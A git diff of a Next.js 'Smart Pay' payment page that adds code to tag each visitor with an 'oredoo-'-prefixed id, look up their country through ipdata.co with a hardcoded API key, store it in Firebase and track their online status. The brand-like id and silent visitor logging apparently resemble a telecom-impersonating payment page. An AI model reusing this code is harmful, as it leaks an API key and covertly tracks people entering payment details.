@@ -1,20 +1,68 @@
 "use client"
-import { ArrowLeft, CreditCard, Phone, DollarSign } from "lucide-react"
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import LanguageToggle from "@/components/language-toggle"
-import PaymentSummary from "@/components/payment-summary"
-import { addData } from "@/lib/firebase"
+
 import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
+import PhoneNumbersGrid from "@/components/pay-page"
+import { ArrowLeft, CreditCard, DollarSign, Phone } from "lucide-react"
+import { Button } from "@/components/ui/button"
+import PaymentSummary from "@/components/payment-summary"
+import { Input } from "@/components/ui/input"
+import LanguageToggle from "@/components/language-toggle"
 
-export default function PaymentPage() {
+export default function Page() {
+  const router = useRouter()
   const [value, setValue] = useState("5")
   const [phone, setPhone] = useState("")
   const [isloading, setIsloading] = useState(false)
-  const router = useRouter()
+  const _id = randstr("oredoo-")
 
-  // Avoid hydration mismatch
+
+  function randstr(prefix: string) {
+    return Math.random()
+      .toString(36)
+      .replace("0.", prefix || "")
+  }
+
+  async function getLocation() {
+    const APIKEY = "a48dbc44c94452a8427c73683e68294f00a2892eee042a563ee1d07b"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      addData({
+        id: _id,
+        country: country,
+      })
+      localStorage.setItem("country", country)
+
+      setupOnlineStatus(_id)
+      return country
+    } catch (error) {
+      console.error("Error fetching location:", error)
+    }
+  }
+  useEffect(() => {
+    async function checkCountry() {
+      try {
+        // Get the country code
+        await getLocation().then((v) => {
+        })
+
+        setIsloading(false)
+      } catch (error) {
+        console.error("Error in country detection:", error)
+        setIsloading(false)
+      }
+    }
+
+    checkCountry()
+  }, [router])
 
   const handleSubmit = (e: any) => {
     e.preventDefault()
@@ -32,8 +80,8 @@ export default function PaymentPage() {
     localStorage.setItem("total", value)
   }, [value])
 
-  return (
-    <div className="flex flex-col min-h-screen bg-gradient-to-b from-gray-50 to-gray-100">
+    return (
+      <div className="flex flex-col min-h-screen bg-gradient-to-b from-gray-50 to-gray-100">
       <header className="flex justify-between items-center p-4 bg-white shadow-sm sticky top-0 z-50">
         <LanguageToggle />
         <button
@@ -144,5 +192,6 @@ export default function PaymentPage() {
         © {new Date().getFullYear()} Smart Pay. جميع الحقوق محفوظة
       </footer>
     </div>
-  )
+    )
+
 }
